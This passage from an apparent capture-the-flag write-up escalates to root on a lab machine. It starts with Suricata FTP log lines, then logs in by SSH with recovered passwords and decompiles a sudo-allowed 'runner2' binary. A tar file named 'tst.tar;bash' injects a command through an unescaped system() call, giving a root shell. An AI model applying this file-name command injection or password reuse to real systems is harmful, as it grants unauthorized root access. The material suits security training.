eve.json.8.gz:{"timestamp":"2023-09-28T17:45:32.648919+0000","flow_id":1218304978677234,"in_iface":"ens33","event_type":"ftp","src_ip":"192.168.227.229","src_port":45760,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","tx_id":7,"community_id":"1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=","ftp":{"command":"QUIT","completion_code":["221"],"reply":["Goodbye."],"reply_received":"yes"}}
eve.json.8.gz:{"timestamp":"2023-09-28T17:45:32.648990+0000","flow_id":1218304978677234,"in_iface":"ens33","event_type":"alert","src_ip":"192.168.227.229","src_port":45760,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","community_id":"1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=","alert":{"action":"allowed","gid":1,"signature_id":2001,"rev":2001,"signature":"FTP Failed Login Attempt","category":"","severity":3},"app_proto":"ftp","app_proto_tc":"failed","flow":{"pkts_toserver":18,"pkts_toclient":15,"bytes_toserver":1259,"bytes_toclient":1415,"start":"2023-09-28T17:44:27.224754+0000"}}
eve.json.8.gz:{"timestamp":"2023-09-28T17:49:34.537400+0000","flow_id":1218304978677234,"in_iface":"ens33","event_type":"alert","src_ip":"192.168.227.229","src_port":45760,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","community_id":"1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=","alert":{"action":"allowed","gid":1,"signature_id":2001,"rev":2001,"signature":"FTP Failed Login Attempt","category":"","severity":3},"app_proto":"ftp","app_proto_tc":"failed","flow":{"pkts_toserver":18,"pkts_toclient":15,"bytes_toserver":1259,"bytes_toclient":1415,"start":"2023-09-28T17:44:27.224754+0000"}}
eve.json.8.gz:{"timestamp":"2023-09-28T17:49:34.537668+0000","flow_id":1218304978677234,"in_iface":"ens33","event_type":"flow","src_ip":"192.168.227.229","src_port":45760,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","app_proto":"ftp","app_proto_tc":"failed","flow":{"pkts_toserver":18,"pkts_toclient":15,"bytes_toserver":1259,"bytes_toclient":1415,"start":"2023-09-28T17:44:27.224754+0000","end":"2023-09-28T17:45:32.648990+0000","age":65,"state":"closed","reason":"timeout","alerted":true},"community_id":"1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=","tcp":{"tcp_flags":"1b","tcp_flags_ts":"1b","tcp_flags_tc":"1b","syn":true,"fin":true,"psh":true,"ack":true,"state":"closed"}}

```
from the first one the password is `Lopezzz1992%123` and it didn't work, but the second password `Lopezz1992%123` worked and we code ssh as lopez.


## shell as root

starting by finding which commands can be run as root
```bash
lopez@intuition:~$ sudo -l
[sudo] password for lopez: 
Matching Defaults entries for lopez on intuition:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User lopez may run the following commands on intuition:
    (ALL : ALL) /opt/runner2/runner2
```

It seems to be another version of runner program we saw before
Let's try to run it
```bash
lopez@intuition:~$ sudo /opt/runner2/runner2 
[sudo] password for lopez: 
Usage: /opt/runner2/runner2 <json_file>
```

I created an empty json file with just `{}` and ran it again.
```bash
lopez@intuition:~$ sudo /opt/runner2/runner2 ./tst.json 
Run key missing or invalid.
```

from the error we know that there's a key called `run` so let's make the content of json something like this `{"run":"true"}` and i got the same error.
After many trials i got a new error when the content of json became ``{"run":{}}`
```bash
lopez@intuition:~$ sudo /opt/runner2/runner2 ./tst.json 
[sudo] password for lopez: 
Action key missing or invalid.
```

I added the action key and after trials i found that the values will be the actions we saw in the runner1.c `list, run, install` so i made the json to be `{"run":{"action":"list"}}`.
```bash
lopez@intuition:~$ sudo /opt/runner2/runner2 ./tst.json 
1: apt_update.yml
```
Now it works well, let's try `install` action by making the json content to be `{"run":{"action":"install"}}`
```bash
lopez@intuition:~$ sudo /opt/runner2/runner2 ./tst.json 
Authentication key missing or invalid for 'install' action.
```
Authentication key is what we got by hashcat so i tried to add it but i faced errors also.
Now we will reverse runner2 in order to understand the format of the json file

```c


undefined8 main(int param_1,undefined8 *param_2)

{
  int iVar1;
  FILE *__stream;
  long lVar2;
  int *piVar3;
  int *piVar4;
  char *pcVar5;
  undefined8 uVar6;
  DIR *__dirp;
  dirent *pdVar7;
  int local_80;
  char *local_78;
  
  if (param_1 != 2) {
    printf("Usage: %s <json_file>\n",*param_2);
    return 1;
  }
  __stream = fopen((char *)param_2[1],"r");
  if (__stream == (FILE *)0x0) {
    perror("Failed to open the JSON file");
    return 1;
  }
  lVar2 = json_loadf(__stream,2,0);
  fclose(__stream);
  if (lVar2 == 0) {
    fwrite("Error parsing JSON data.\n",1,0x19,stderr);
    return 1;
  }
  piVar3 = (int *)json_object_get(lVar2,&DAT_00102148);
  if ((piVar3 == (int *)0x0) || (*piVar3 != 0)) {
    fwrite("Run key missing or invalid.\n",1,0x1c,stderr);
  }
  else {
    piVar4 = (int *)json_object_get(piVar3,"action");
    if ((piVar4 == (int *)0x0) || (*piVar4 != 2)) {
      fwrite("Action key missing or invalid.\n",1,0x1f,stderr);
    }
    else {
      pcVar5 = (char *)json_string_value(piVar4);
      iVar1 = strcmp(pcVar5,"list");
      if (iVar1 == 0) {
        listPlaybooks();
      }
      else {
        iVar1 = strcmp(pcVar5,"run");
        if (iVar1 == 0) {
          piVar3 = (int *)json_object_get(piVar3,&DAT_00102158);
          piVar4 = (int *)json_object_get(lVar2,"auth_code");
          if ((piVar4 != (int *)0x0) && (*piVar4 == 2)) {
            uVar6 = json_string_value(piVar4);
            iVar1 = check_auth(uVar6);
            if (iVar1 != 0) {
              if ((piVar3 == (int *)0x0) || (*piVar3 != 3)) {
                fwrite("Invalid \'num\' value for \'run\' action.\n",1,0x26,stderr);
              }
              else {
                iVar1 = json_integer_value(piVar3);
                __dirp = opendir("/opt/playbooks/");
                if (__dirp == (DIR *)0x0) {
                  perror("Failed to open the playbook directory");
                  return 1;
                }
                local_80 = 1;
                local_78 = (char *)0x0;
                while (pdVar7 = readdir(__dirp), pdVar7 != (dirent *)0x0) {
                  if ((pdVar7->d_type == '\b') &&
                     (pcVar5 = strstr(pdVar7->d_name,".yml"), pcVar5 != (char *)0x0)) {
                    if (local_80 == iVar1) {
                      local_78 = pdVar7->d_name;
                      break;
                    }
                    local_80 = local_80 + 1;
                  }
                }
                closedir(__dirp);
                if (local_78 == (char *)0x0) {
                  fwrite("Invalid playbook number.\n",1,0x19,stderr);
                }
                else {
                  runPlaybook(local_78);
                }
              }
              goto LAB_00101db5;
            }
          }
          fwrite("Authentication key missing or invalid for \'run\' action.\n",1,0x38,stderr);
          json_decref(lVar2);
          return 1;
        }
        iVar1 = strcmp(pcVar5,"install");
        if (iVar1 == 0) {
          piVar3 = (int *)json_object_get(piVar3,"role_file");
          piVar4 = (int *)json_object_get(lVar2,"auth_code");
          if ((piVar4 != (int *)0x0) && (*piVar4 == 2)) {
            uVar6 = json_string_value(piVar4);
            iVar1 = check_auth(uVar6);
            if (iVar1 != 0) {
              if ((piVar3 == (int *)0x0) || (*piVar3 != 2)) {
                fwrite("Role File missing or invalid for \'install\' action.\n",1,0x33,stderr);
              }
              else {
                uVar6 = json_string_value(piVar3);
                installRole(uVar6);
              }
              goto LAB_00101db5;
            }
          }
          fwrite("Authentication key missing or invalid for \'install\' action.\n",1,0x3c,stderr);
          json_decref(lVar2);
          return 1;
        }
        fwrite("Invalid \'action\' value.\n",1,0x18,stderr);
      }
    }
  }
LAB_00101db5:
  json_decref(lVar2);
  return 0;
}



void _fini(void)

{
  return;
}

```
This is the main function and we are interested also in `install role` function which is here
```c

void installRole(undefined8 param_1)

{
  int iVar1;
  long in_FS_OFFSET;
  char local_418 [1032];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  iVar1 = isTarArchive(param_1);
  if (iVar1 == 0) {
    fwrite("Invalid tar archive.\n",1,0x15,stderr);
  }
  else {
    snprintf(local_418,0x400,"%s install %s","/usr/bin/ansible-galaxy",param_1);
    system(local_418);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    // WARNING: Subroutine does not return
    __stack_chk_fail();
  }
  return;
}
```


after code examination i reached that the json file should be like this:
```json
{
  "run": {
    "action": "install",
    "role_file":"<path/to/tar file>"
  },
  "auth_code": "UHI75GHINKOP"
}
```
and the command injection will be the name of the role file

We will create the file using `tar -cvf tar_file_name file_to_be_compressed`.
```bash
lopez@intuition:~$ tar -cvf tst.tar\;bash tst.json 
tst.json
```
and the content of tst.json is
```json
{
  "run": {
    "action": "install",
    "role_file":"tst.tar\;bash"
  },
  "auth_code": "UHI75GHINKOP"
}
```
Then run `sudo /opt/runner2/runner2 ./tst.json` and you will get shell as root
```bash
root@intuition:/home/lopez# whoami
root
root@intuition:/home/lopez# cat /root/root.txt
*******************************d
```
Congratzz